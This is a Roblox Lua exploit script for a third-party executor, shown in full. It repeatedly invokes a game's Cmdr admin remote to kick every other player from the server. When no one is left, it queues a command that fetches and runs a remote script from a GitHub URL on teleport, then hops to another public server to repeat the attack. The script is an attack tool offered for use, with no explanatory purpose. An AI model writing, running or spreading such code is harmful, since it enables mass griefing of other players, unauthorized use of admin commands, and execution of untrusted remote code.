
function ServerHop()
    -- Ensure randomness
    math.randomseed(tick())

    placeId = game.PlaceId
    jobId = game.JobId
    url = string.format(
        'https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100',
        placeId
    )

    -- Fetch server list via executor HTTP
    success, response = pcall(function()
        return http_request({
            Url = url,
            Method = 'GET',
        })
    end)
    if not success or not response or not response.Success then
        task.delay(1, ServerHop)
        return
    end

    -- Decode and filter
    data = HttpService:JSONDecode(response.Body).data or {}
    candidates = {}
    for _, server in ipairs(data) do
        if server.id ~= jobId and 10 < server.maxPlayers then
            table.insert(candidates, server.id)
        end
    end

    if #candidates == 0 then
        task.delay(1, ServerHop)
        return
    end

    shuffle(candidates)
    targetId = candidates[1]

    ok, err = pcall(function()
        TeleportService:TeleportToPlaceInstance(
            placeId,
            targetId,
            Players.LocalPlayer
        )
    end)
    if not ok then
        task.delay(1, ServerHop)
    end
end

while task.wait(0.1) do 
    if #game.Players:GetChildren() ~= 1 then 
        for _, o in pairs(game.Players:GetChildren()) do 
            if o ~= game.Players.LocalPlayer then 
                local args = {
                    [1] = "kick " .. o.Name,
                    [2] = {}
                }

                game:GetService("ReplicatedStorage"):WaitForChild("CmdrClient"):WaitForChild("CmdrFunction"):InvokeServer(unpack(args))
            end
        end
    else
        queueonteleport([[
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenith-Hub/Xenith-Hub/refs/heads/main/KickAllFun"))()
        ]])

        ServerHop()    
    end
end
